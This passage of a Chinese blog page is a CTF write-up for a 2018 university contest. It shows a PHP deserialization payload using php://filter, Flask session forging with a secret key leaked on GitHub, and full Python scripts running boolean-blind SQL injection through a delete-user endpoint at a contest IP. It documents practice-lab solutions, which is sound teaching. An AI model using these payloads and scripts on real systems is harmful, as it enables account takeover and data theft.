file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$pass=<span class="keyword">new</span> Read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($pass);</span><br></pre></td></tr></table></figure></p>
+<p>payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?user=php:<span class="comment">//input&amp;file=class.php&amp;pass=O:4:"Read":1:&#123;s:4:"file";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";&#125;</span></span><br><span class="line"></span><br><span class="line">post: admin</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-87c11d00b4b43f69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>解密后得到flag</p>
+<h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><p>  这题不会，膜一波官方wp<br>刚开始做了很长时间没找到思路，<br>只知道test，user两个号能登陆，不过是普通用户，没卵用<br><img src="https://upload-images.jianshu.io/upload_images/9113981-c5da609d05dbd009.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>看到session后觉着这里能利用，解压前面的base64后，<br><img src="https://upload-images.jianshu.io/upload_images/9113981-8b85e1fe1cf2fef6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>突然想到换成admin去利用，不过这里不存在的，没私钥不可能登admin<br>基本放弃，后来官方给了提示，图片地址很关键。。。<br><img src="https://upload-images.jianshu.io/upload_images/9113981-f4fe67289e27cd96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>看了下图片地址<br><a href="https://raw.githubusercontent.com/alipql/tuku/master/8856eac7gy1fkmf2o66yyj205k05kq2z.jpg可以发现alipql这个人的github仓库：" target="_blank" rel="noopener">https://raw.githubusercontent.com/alipql/tuku/master/8856eac7gy1fkmf2o66yyj205k05kq2z.jpg可以发现alipql这个人的github仓库：</a> <a href="https://github.com/alipql" target="_blank" rel="noopener">https://github.com/alipql</a> 在homework这个库里面的homework2中可以找到一个非空的config.py配置文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span><span class="params">()</span>:</span></span><br><span class="line">    BaseDir = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line">    DB_FILE = os.path.join(BaseDir, <span class="string">'dbfile.sql'</span>)</span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">'sqlite:///'</span> + DB_FILE</span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="keyword">True</span></span><br><span class="line">    SQLALCHEMY_COMMIT_ON_TEARDOWN = <span class="keyword">True</span></span><br><span class="line">    SECRET_KEY = <span class="string">'dropseckey123'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">config = &#123;</span><br><span class="line">    <span class="string">'default'</span>: Config</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从config.py配置文件中可得到secert_key、sql数据库类型。<br>真是一波社工操作<br>拿到secert_key后，利用它进行flask的session伪造<br>脚本<br>伪造session exp：<a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""" Flask Session Cookie Decoder/Encoder """</span></span><br><span class="line">__author__ = <span class="string">'Wilson Sumanang, Alexandre ZANNI'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># standard imports</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># Description for help</span></span><br><span class="line">parser = argparse.ArgumentParser(</span><br><span class="line">            description=<span class="string">'Flask Session Cookie Decoder/Encoder'</span>,</span><br><span class="line">            epilog=<span class="string">"Author : Wilson Sumanang, Alexandre ZANNI"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare sub commands</span></span><br><span class="line">subparsers = parser.add_subparsers(help=<span class="string">'sub-command help'</span>, dest=<span class="string">'subcommand'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create the parser for the encode command</span></span><br><span class="line">parser_encode = subparsers.add_parser(<span class="string">'encode'</span>, help=<span class="string">'encode'</span>)</span><br><span class="line">parser_encode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                            help=<span class="string">'Secret key'</span>, required=<span class="keyword">True</span>)</span><br><span class="line">parser_encode.add_argument(<span class="string">'-t'</span>, <span class="string">'--cookie-structure'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                            help=<span class="string">'Session cookie structure'</span>, required=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create the parser for the decode command</span></span><br><span class="line">parser_decode = subparsers.add_parser(<span class="string">'decode'</span>, help=<span class="string">'decode'</span>)</span><br><span class="line">parser_decode.add_argument(<span class="string">'-s'</span>, <span class="string">'--secret-key'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                            help=<span class="string">'Secret key'</span>, required=<span class="keyword">False</span>)</span><br><span class="line">parser_decode.add_argument(<span class="string">'-c'</span>, <span class="string">'--cookie-value'</span>, metavar=<span class="string">'&lt;string&gt;'</span>,</span><br><span class="line">                            help=<span class="string">'Session cookie value'</span>, required=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get args</span></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockApp</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, secret_key)</span>:</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_cookie_encoder</span><span class="params">(secret_key, session_cookie_structure)</span>:</span></span><br><span class="line">    <span class="string">""" Encode a Flask session cookie """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">        si = SecureCookieSessionInterface()</span><br><span class="line">        s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"[Encoding error]&#123;&#125;"</span>.format(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_cookie_decoder</span><span class="params">(session_cookie_value, secret_key=None)</span>:</span></span><br><span class="line">    <span class="string">""" Decode a Flask cookie  """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span>(secret_key==<span class="keyword">None</span>):</span><br><span class="line">            compressed = <span class="keyword">False</span></span><br><span class="line">            payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">                compressed = <span class="keyword">True</span></span><br><span class="line">                payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">            data = payload.split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            data = base64_decode(data)</span><br><span class="line">            <span class="keyword">if</span> compressed:</span><br><span class="line">                data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">            si = SecureCookieSessionInterface()</span><br><span class="line">            s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"[Decoding error]&#123;&#125;"</span>.format(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># find the option chosen</span></span><br><span class="line">    <span class="keyword">if</span>(args.subcommand == <span class="string">'encode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> args.cookie_structure <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>):</span><br><span class="line">            print(session_cookie_encoder(args.secret_key, args.cookie_structure))</span><br><span class="line">    <span class="keyword">elif</span>(args.subcommand == <span class="string">'decode'</span>):</span><br><span class="line">        <span class="keyword">if</span>(args.secret_key <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">and</span> args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>):</span><br><span class="line">            print(session_cookie_decoder(args.cookie_value,args.secret_key))</span><br><span class="line">        <span class="keyword">elif</span>(args.cookie_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>):</span><br><span class="line">            print(session_cookie_decoder(args.cookie_value))</span><br></pre></td></tr></table></figure></p>
+<p>然后利用脚本去测试一下已知的test，可通过登录用户时返回的session验证SECRETKEY是否正确</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-63c71f5e0c4356d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>可以利用，然后去伪造admin的session<br><img src="https://upload-images.jianshu.io/upload_images/9113981-a1f4c0160b530d0d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这俩是登陆后的session去伪造，都一样可以用<br><img src="https://upload-images.jianshu.io/upload_images/9113981-f1c90510dbcbe322.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9113981-bcc2bb1b265d9c56.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>替换掉session，即可成功登录到admin账户获取管理权限。<br><img src="https://upload-images.jianshu.io/upload_images/9113981-115c8d3c4607aebe.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-53c1f36abea96040.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可以看到admin的加密密码是不存在的，所以爆破也是不可能的。从这可以得到一个tip，存在一个flag表和flag字段。</p>
+<h4 id="delete布尔盲注"><a href="#delete布尔盲注" class="headerlink" title="delete布尔盲注"></a>delete布尔盲注</h4><p>对添加用户功能和删除用户功能稍微一测试，会发现删除用户功能是存在注入的，是delete的注入。从config.py的信息泄露中可以知道数据库为sqlite，导致很多函数不能用；由于又是个delete方式，导致很多姿势用不上。</p>
+<p>在这里轻微fuzz一下可发现只过滤了drop、update、delete等部分删表删flag改flag的关键字，而and、substr、selete、from、空格等未过滤，参数为单引号包裹，所以可组合一个payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' and substr((select flag from flag),1,1)=='</span>f</span><br></pre></td></tr></table></figure></p>
+<p>先增加用户，在删除用户时提交payload再进行布尔判断即可盲注flag。 例如增加111用户后再删除用户111<br><img src="https://upload-images.jianshu.io/upload_images/9113981-0638779c488e22dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/9113981-852da84fd884d55c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>成功删除用户，返回包不存在111，说明flag第一个字母为f。若改为<br>usernamedel=111’ and substr((select flag from flag),1,1)==’0</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-c4326655ef5782b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>显示成功删除却依然存在111用户，没删除用户，说明第一位不为0，然后接下来写脚本去跑就行了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sqliexp</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.url = <span class="string">'http://172.93.39.218:8888/admin'</span></span><br><span class="line">        self.session = <span class="string">'eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sIm5hbWUiOiJhZG1pbiJ9.XB-iXg.PURonzshjlDsEvsXYZ24YyuAgI4'</span></span><br><span class="line">        self.flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#增加111用户</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">adduser</span><span class="params">(self)</span>:</span></span><br><span class="line">        cookies = &#123;<span class="string">'session'</span>:self.session&#125;</span><br><span class="line">        data = &#123;<span class="string">'username'</span>:<span class="string">'111'</span>,<span class="string">'password'</span>:<span class="string">'111'</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=self.url, cookies=cookies,data=data)</span><br><span class="line">        <span class="keyword">except</span> TimeoutError:</span><br><span class="line">            exit(<span class="number">-1</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">deluser</span><span class="params">(self,num)</span>:</span></span><br><span class="line">        cookies = &#123;<span class="string">'session'</span>:self.session&#125;</span><br><span class="line">        <span class="keyword">for</span> strs <span class="keyword">in</span> <span class="string">'flag&#123;&#125;0123456789bcde'</span>:</span><br><span class="line">            payload = <span class="string">"111' and substr((select flag from flag),%d,1)=='%s"</span> % (num,strs)</span><br><span class="line">            data = &#123;<span class="string">'usernamedel'</span>:payload&#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url=self.url,data=data,cookies=cookies)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'111'</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                    self.flag += strs</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> TimeoutError:</span><br><span class="line">                exit(<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp = sqliexp()</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">39</span>,<span class="number">1</span>):</span><br><span class="line">        exp.adduser()</span><br><span class="line">        exp.deluser(num)</span><br><span class="line">        print(exp.flag)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-4ada66a88c0c2215.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>另附脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://172.93.39.218:8888/admin"</span></span><br><span class="line">_cookies = &#123;<span class="string">"session"</span>:<span class="string">"eyJuYW1lIjoiYWRtaW4ifQ.XB8bYA.JJ0tfi65cm3uS-ATDe9FNls4y_Y"</span>&#125;</span><br><span class="line">flag = <span class="string">"flag&#123;db"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">50</span>):</span><br><span class="line">	r= requests.post(url,cookies=_cookies,data=&#123;<span class="string">"username"</span>:<span class="string">"iv4n"</span>,<span class="string">"password"</span>:<span class="string">"a"</span>&#125;)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"1234567890qazxswedcvfrtgbnhyujmkiolp&#123;&#125;"</span>:</span><br><span class="line">		r = requests.post(url,cookies=_cookies,data=&#123;<span class="string">"usernamedel"</span>:<span class="string">f"iv4n' and (select hex(substr(flag,<span class="subst">&#123;i&#125;</span>,1)) from flag)=hex('<span class="subst">&#123;j&#125;</span>')-- -"</span>&#125;)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"iv4n"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			flag += j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	print(flag)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-b2cfda37997538a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<h1 id="CYPTO"><a href="#CYPTO" class="headerlink" title="CYPTO"></a>CYPTO</h1><p>就给了一张图，本来不知道什么加密，上面放了张海伦的图，海伦是个盲人，盲文？（其实是问了学姐才知道的2333）</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-664d04844f126c73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>百度盲文表<br><img src="https://upload-images.jianshu.io/upload_images/9113981-14a47078c07559c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>然后对照是<br>kmdonowg<br>然后MD5加密得flag</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="中原工学院图书馆"><a href="#中原工学院图书馆" class="headerlink" title="中原工学院图书馆"></a>中原工学院图书馆</h3><p>这道隐写题原来在windows下没分出来，kali下binwalk可以分出来一个压缩包，里面有txt文件，打开看<br>可以看到文件头是png的，改为png</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-3b683e2184402dc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-d000e9ac7892b550.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-a4d2c5fe282de5c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>然后rot13</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-c7e3a68898a5ef2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+
+      
+    </div>
+    
+    
+    
+		
+		<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2019/01/06/zhongyuangongctf/">2018中原工学院网络安全校赛</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 berlin 的个人博客">berlin</a></p>
+  <p><span>发布时间:</span>2019年01月06日 - 20:01</p>
+  <p><span>最后更新:</span>2019年01月06日 - 20:01</p>
+  <p><span>原始链接:</span><a href="/2019/01/06/zhongyuangongctf/" title="2018中原工学院网络安全校赛">http://yoursite.com/2019/01/06/zhongyuangongctf/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2019/01/06/zhongyuangongctf/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+      
+    </div> 
+		
+    
+		
+		<div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+    </div>
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/06/phpcmsbug/" rel="next" title="phpcms2008远程代码执行漏洞">
+                <i class="fa fa-chevron-left"></i> phpcms2008远程代码执行漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/01/06/bugkuctf/" rel="prev" title="BugKu-wp">
+                BugKu-wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=RA-5ba8b3dc680529ed" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNzU3MS8xNDEwMw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/zhenzhen.jpg"
+                alt="berlin" />
+            
+              <p class="site-author-name" itemprop="name">berlin</p>
+              <p class="site-description motion-element" itemprop="description">每天都是美好的一天</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://zhoubolin.github.io" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1057032770@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.jianshu.com/u/c531954533ea" target="_blank" title="简书">
+                      
+                        <i class="fa fa-fw fa-globe"></i>简书</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" title="csdn">
+                      
+                        <i class="fa fa-fw fa-globe"></i>csdn</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
